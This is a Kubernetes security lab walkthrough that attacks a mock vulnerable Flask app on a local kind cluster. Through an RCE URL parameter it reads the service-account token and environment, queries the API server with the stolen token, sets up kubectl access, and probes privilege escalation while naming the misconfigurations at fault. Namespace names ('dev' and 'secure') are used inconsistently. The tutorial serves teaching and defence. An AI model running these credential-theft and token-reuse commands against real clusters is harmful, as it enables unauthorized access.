---
Author:
  - Kumail Rizvi
Author Profile:
  - https://linkedin.com/in/kumail-rizvi
tags:
  - Kubernetes
  - security
  - API
Creation Date: 2024-08-22T02:58:32
Last Date: 2024-08-22T02:58:32
DocID: KS-2-24
drafts: 
References: https://docs.snyk.io/
description:
---

## Accessing Vulnerable Application and taking up control over the  Cluster 

In this documentation we will see how combination of an application vulnerability and a misconfiguration can allow an attacker to spread the blast radius of an attack on a Kubernetes cluster using common default configurations.

Before proceeding with Kubernetes Security Part 2, it's recommended to review [[Kubernetes Security (Part-1)| Kubernetes Security-1]] ensure you have a solid understanding of the foundational concepts.


> [!NOTE] 
> ### This is a pattern that almost every major exploit of recent years has followed: an application vulnerability gives an attacker the initial foothold and then application and infrastructure level misconfigurations allow that attacker to spread in the other parts of your cluster.

### Setting up the scene

Imagine a hacker,  have found a vulnerable application on the Internet which is hosted on your cluster . He don't know much else about it other than the fact that it has a particular vulnerability. In this documentation we will use a mock-up application that has a remote control command execution **(RCE) vulnerability** which is going to allow us to run commands directly on the server that's running the web application. 

Here we will use a simple Flask app that has a simulated RCE, but these kinds of vulnerabilities do exist in the wild such as in middleware, libraries, and container images. This kind of vulnerability allows an attacker to pass malformed or specifically crafted HTTP requests to allow them to run commands directly on the target server.

Lets see a demo and understand the attack 

1. we would have a application deployment named `webadmin` ,  in a isolated namespace `dev` with its own service and this service is exposed via a ingress controller . Here we are replicating the attack on a`kind` cluster 

`webadmin-deployment.yaml`

```yaml
# Create a deployment for webadmin to use the service account
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webadmin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: webadmin
  template:
    metadata:
      labels:
        app: webadmin
    spec:
      serviceAccountName: webadmin
      securityContext:
        runAsUser: 999 # Must be non-0 if you use the PSP
        fsGroup: 999 # As of 1.15 (I think) you need this set to access the servicetoken for the pod
      containers:
      - name: webadmin
        image: ericsmalling/webadmin:latest
        imagePullPolicy: Always
```

`service.yaml`

```yaml
apiVersion: v1
kind: Service
metadata:
  name: webadmin
  labels:
    app: webadmin
spec:
  selector:
    app: webadmin
  ports:
  - port: 5000
```

`ingress-rule.yaml`

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webadmin-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
spec:
  # ingressClassName: webadmin-ingress
  rules:
  - http:
      paths:
      - path: /webadmin
        pathType: Prefix
        backend:
          service:
            name: webadmin
            port:
              number: 5000
```

2. This would have a URL  [http://localhost/webadmin](http://localhost/webadmin) based on the ingress setup and having a host name , now lets exploits it as an attacker 
---

### PART 1 : Examining the vulnerability

1. Open the vulnerable application in your browser at [http://localhost/webadmin](http://localhost/webadmin) The vulnerability can be exploited by passing a `cmd` URL parameter. For example, the following will execute a `hostname` command and show the console output on the returned page: [http://localhost/webadmin?cmd=hostname](http://localhost/webadmin?cmd=hostname)

![[IMAGE 20240712205046.png]]


2. Ok, that proves that our RCE is working so now let's use it to get some more interesting information. Change the `cmd` parameter to `env` to print out the processes' environment variables: [http://localhost/webadmin?cmd=env](http://localhost/webadmin?cmd=env)

![[IMAGE 20240712205128.png]]

3. Base on the various variable names starting with `KUBERNETES`, it's pretty safe to assume this process is running in a container, on a Kubernetes cluster. 

4. Also, given that the `hostname` command returned a name prefixed with `webadmin` the `WEBADMIN_SERVICE_PORT=5000` variable probably means there is a Kubernetes Service listening internally on port 5000 and some kind of LoadBalancer and/or Ingress is proxying/translating our port 80 request to that port. 

5. Finally, the `KUBERNETES_PORT=tcp://10.96.0.1:443` variable tells me that the Kubernetes api-server internal IP address and port is at `10.96.0.1:443`.

6. The next bit of information we want to find out is the IP address of the pod we are running in so let's run `hostname -i`: [http://localhost/webadmin?cmd=hostname%20-i](http://localhost/webadmin?cmd=hostname%20-i)

![[IMAGE 20240712210007.png]]

### Checkpoint

- Let's take a moment to collect our notes and track our progress.

#### What we now know:

- An application with an RCE vulnerability is available to us on port 80
- The application is running in a container on a Kubernetes cluster
- The application is behind a service listening on port 5000
- The Kubernetes api-server internal IP address
- The IP address of the container/pod the application is running in

Here is a Visual Representation:

![[IMAGE 20240712212104.png]]

Also we can tracker the exploit range with a graph here 

### Timeline of Doom

![[IMAGE 20240712210730.png]]

---

### Part 2: Accessing the api-server inside the cluster 

1. Every Kubernetes Pod has a service token by default which is associated with its ServiceAccount. By default, this token is auto-mounted into every Pod at the path `var/run/secrets/kubernetes.io/serviceaccount/token`. Let's use the RCE to try to print out that token using the `cat` command:

[http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token](http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)

![[IMAGE 20240712210913.png]]

We now have the Pod token, so we have some credentials to play with. This can be used to help us explore other places in the cluster. 

2. It's also worth noting that even if this was just a **directory traversal exploit**, much of what we found—including this token—could also have been discovered. Even the environment variables are visible via the `/proc` file system. For example, printing out the contents of `/proc/self/environ` would give us the equivilent of running `env`: [http://localhost/webadmin?cmd=cat%20/proc/self/environ](http://localhost/webadmin?cmd=cat%20/proc/self/environ)

![[IMAGE 20240712211009.png]]

Now we got into the `.env` or `envorinmental variables`  of the code and other sensitive creds such as endpoint of cluster 

2. Lets see if we can have internet access via this RCE , Let's see if we have `curl` available: [http://localhost/webadmin?cmd=curl%20https://google.com](http://localhost/webadmin?cmd=curl%20https://google.com)

![[IMAGE 20240712211329.png]]

Volia ! Successfully !! 

3. Now we will take all the sensitive information from the container , We will use curl and the token credential to try to connect to the Kubernetes api-server and ask it for the cluster endpoints. The connection details are as follows:
- **Host:** the `KUBERNETES_PORT` variable value
- **URI:** the default namespace "endpoints" API `/api/v1/namespaces/default/endpoints` (it is often open to queries by any client)
- **Header:** An `Authorization: Bearer` containing contents of the token file from above\
- **CA Cert:** The CA certificate which we can assume will be in the default location at the same path as our token file and named `ca.crt`

The URL to open (replace `10.96.0.1` with your `KUBERNETES_PORT`): [http://localhost/webadmin?cmd=curl%20--cacert%20/var/run/secrets/kubernetes.io/serviceaccount/ca.crt%20-H%20%22Authorization:%20Bearer%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)%22%20https://10.96.0.1/api/v1/namespaces/default/endpoints](http://localhost/webadmin?cmd=curl%20--cacert%20/var/run/secrets/kubernetes.io/serviceaccount/ca.crt%20-H%20%22Authorization:%20Bearer%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)%22%20https://10.96.0.1/api/v1/namespaces/default/endpoints)

![[IMAGE 20240712211735.png]]

This command succeeds, and notice the section:

```yaml
"subsets": [
  {
    "addresses" : [
       {
         "ip": "172.19.0.3"
       }
    ],"
```

4. In a real environment, that `ip` would give us the external address for the Kubernetes API server. Because we are running in Kind, it won't be this IP address, it will just be exposed on localhost with the same port. This is a vulnerability, and has been created by a too permissive policy for the service token.

#### New info:

- The ServiceAccount and Pod configurations in this application's Namespace is using the default `automountServiceAccountToken` setting of `true`

- Using a found ServiceAccount token, we were able to connect to the cluster's api-server

- The api-server returned Endpoint information exposing its external IP _(although our workshop Kind cluster obscures this in practice)_

![[public/image-1.png]]

Lets see the timeline again 

#### Timeline of Doom

Updated progress toward total ownership of the target cluster.

![[IMAGE 20240712212224.png]]

---

## Part 3: Cluster Exploration and creation of Backdoor 

1. We want to be able to use `kubectl` to directly access the cluster instead of having to use the clunky RCE URL. To do this, we will copy the contents of the token from [http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token](http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token) into a kubectl config file. 

2.  Once configuring the kube config file , now we will have direct access to the kubernetes cluster , so basically we are creating a backdoor in the cluster 

3. With our kubectl context now set, let's try to access the cluster by running `kubectl get pods`:

```
$ kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:dev:webadmin" cannot list resource "pods" in API group "" in the namespace "default"
```

4. The "Forbidden" error we see above is simply telling us that the ServiceAccount that we are using—via that token—doesn't have sufficient privileges to list Pods in the `default` Namespace. This error, though reveals something useful in the User value: `"system:serviceaccount:dev:webadmin"`. That string contains the name of the Namespace the ServiceAccount is from: `dev`. So, the Pod that we copied the token from is running in a Namespace named, "secure".

5. Given that bit if information, let's try to list Pods in the `dev` Namespace by adding `-n dev` to the command:

```
$ kubectl get pods -n dev
NAME                        READY   STATUS    RESTARTS   AGE
webadmin-69dd65c7f9-hx9cr   1/1     Running   0          10m
```

Success! That is the pod we were attacking with our RCE exploit.

6. Let's see what other privileges this token gives us via the command `kubectl auth can-i --list`

```shell
$ kubectl auth can-i --list
Resources Non-Resource URLs                     Resource Names   Verbs
endpoints  []                                    []               [*]
...
```

7. This shows that, in the `default` Namespace, we have access to all verbs (`*`) on the `endpoints` resource and limited access to other boilerplate ones that are uninteresting at the moment (removed from the example for brevity.) The lack of any `pods` resource here is why we got that "Forbidden" error in the first `get pods` attempt in the default Namespace.

  8. Let's try the same command in the `dev` Namespace, `kubectl auth can-i --list -n dev`:

```shell
$ kubectl auth can-i --list -n dev
Resources Non-Resource URLs                     Resource Names   Verbs
*.*       []                                    []               [*]
...
```

Here we see the "all resources" wildcard (`*.*`) with the set of all verbs meaning we have full access to any resource in the `dev` Namespace

9. So now we know we can do quite a few things in the secure namespace, and not a lot in default. This is a fairly common pattern, to give service accounts permissions in their own namespace.

### Checkpoint 

### Info we got so far 

- An application with an RCE vulnerability is available to us on port 80
- The application is running in a container on a Kubernetes cluster
- The application is behind a service listening on port 5000
- The Kubernetes api-server internal IP address
- The IP address of the container/pod the application is running in
- The ServiceAccount and Pod configurations in the `secure` Namespace is using the default `automountServiceAccountToken` setting of `true`
- Using a found ServiceAccount token, we were able to connect to the cluster's api-server
- The api-server returned Endpoint information exposing its external IP _(although our workshop Kind cluster obscures this in practice)_

#### New info:

- The account for the token gathered has limited access in the `default` Namespace
- The account is from a Namespace titled `dev` where it has broad access.

![[IMAGE 20240712214236.png]]

#### Timeline of Doom

Updated progress toward total ownership of the target cluster.

![[IMAGE 20240712214300.png]]

---

## Part 4: Setting up a beachhead in the cluster

Now that we have Permissions in this secure name space let's see if we can escalate our privileges to break into more areas.

1. First of all, let's exec into the `webadmin` Pod and see what's available to us. Get the Pod name and exec into it:
```shell
$ kubectl get pod -n dev
NAME                        READY   STATUS                       RESTARTS   AGE
webadmin-69dd65c7f9-hx9cr   1/1     Running                      0          3h37m

$ kubectl exec -n secure -it webadmin-69dd65c7f9-hx9cr -- bash
webadmin@webadmin-69dd65c7f9-hx9cr:/usr/src/app$

```

2. Now that we have a shell in the Pod, let's see if we are (or can become) root. Check our user with `whoami`

```shell
webadmin@webadmin-69dd65c7f9-hx9cr:/usr/src/app$ whoami
webadmin
```

3. Not root, but can we become root with `sudo su-`?

 ```shell
webadmin@webadmin-69dd65c7f9-hx9cr:/usr/src/app$ sudo su -
bash: sudo: command not found
```

No `sudo`. This tells us the image is better constructed than many default ones as the authors have taken the time to change to a non-root user and are not shipping sudo.

4. Let's see if we can make modifications to the filesystem: `touch test`

```shell
webadmin@webadmin-69dd65c7f9-hx9cr:/usr/src/app$ touch test
   
webadmin@webadmin-69dd65c7f9-hx9cr:/usr/src/app$ ls -l test
-rw-r--r-- 1 webadmin webadmin 0 Aug 30 18:27 test
  
webadmin@webadmin-69dd65c7f9-hx9cr:/usr/src/app$ df .
Filesystem     1K-blocks     Used Available Use% Mounted on
overlay         61255492 14359844  43754324  25% /
```

5. We can write to the root filesystem the means we could download software or change configuration. We already know we have curl, so that's definitely possible. This is a vulnerability, caused by not setting `readonlyRootFilesystem=true` in the Pod SecurityContext and enforcing it in the PSP.

6. Let's try to launch a pod with a root user using the root access which consists of a container running the `alpine` image that simply sleeps but runs as root by default.

`root_pod.yaml`

```
apiVersion: v1
kind: Pod
metadata:
  name: root-pod
spec:
  containers:
  - name: justsleep
    image: alpine
    command: ["/bin/sleep", "999999"]
```


Deploy the Pod via: `kubectl apply -f root_pod.yaml -n dev`:

```
kubectl apply -f demo_yamls/root_pod.yaml -n secure

Error from server (Forbidden): error when creating "root_pod.yaml": pods "root-pod" is forbidden: violates PodSecurity "restricted:latest": allowPrivilegeEscalation != false (container "justsleep" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "justsleep" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "justsleep" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "justsleep" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

Failed! ☹️ 

7. We can see, from the error, that several "PodSecurity" violations were detected, this error is indicative of Pod Security Admission (PSA) being activated. Based on the specific rules cited, this is likely a `Restricted` Pod Security Context policy. This would also preclude starting up a `privileged` container

8. Given the PSA restrictions, let's try to deploy our own pod using a container image with tooling to help us explore the cluster.  lets create a Pod that runs our container with the proper `securityContext` settings to satisfy PSA. Deploy the Pod via: `kubectl apply -f nonroot_nonpriv_restricted.yaml -n dev:

`nonroot_nopriv_restricted.yaml `

```
apiVersion: v1
kind: Pod
metadata:
  name: snyky
spec:
  containers:
  - name: snyky
    image: ericsmalling/snyky:23.0
    securityContext:
      runAsNonRoot: true
      runAsUser: 999
      seccompProfile:
        type: RuntimeDefault
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
    imagePullPolicy: Always
```

lets deploy this image 

```
$ kubectl apply -f nonroot_nonpriv_restricted.yaml -n dev
pod/snyky created
```
 
```shell
$ kubectl exec -n dev -it snyky -- bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

This image has `sudo` in it, but despite what the login prompt says, if we try to run `sudo ls` we get the following error:

10. Now we will exec into our new Pod and see what we can do: `kubectl exec -n dev -it snyky -- bash`

```
$ kubectl exec -n dev -it snyky -- bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

11. This image has `sudo` in it, but despite what the login prompt says, if we try to run `sudo ls` we get the following error:

```shell
$ sudo ls
sudo: The "no new privileges" flag is set, which prevents sudo from running as root.
sudo: If sudo is running in a container, you may need to adjust the container configuration to disable the flag.
```

This is because the `securityContext` settings in the Pod manifest are set to `allowPrivilegeEscalation: false` to satisfy PSA.

**Side note:** On older clusters that still run the obsolete Pod Security Policy restrictions, it often is possible to launch a pod with a non-root user but that includes a `sudo` (or other SUID binary) and elevate to root after the pod is running. This is because the Pod SecurityContext default for `allowPrivilegeEscalation` is `true` and, unless someone explicitly adds a check for it in their PSP, it will be allowed.

#### New info:

- The application container is somewhat hardened by running as a non-root user and its image does not include `sudo`
- The application container is not running with a `readOnlyRootFilesystem:true` so it's mutable
- There are PSA Restricted configurations in place in the `secure` Namespace that restrict root users and privileged mode containers/pods as well as privilege escalation via SUID

![[IMAGE 20240713020646.png]]

#### Timeline of Doom

![[IMAGE 20240713020706.png]]

---

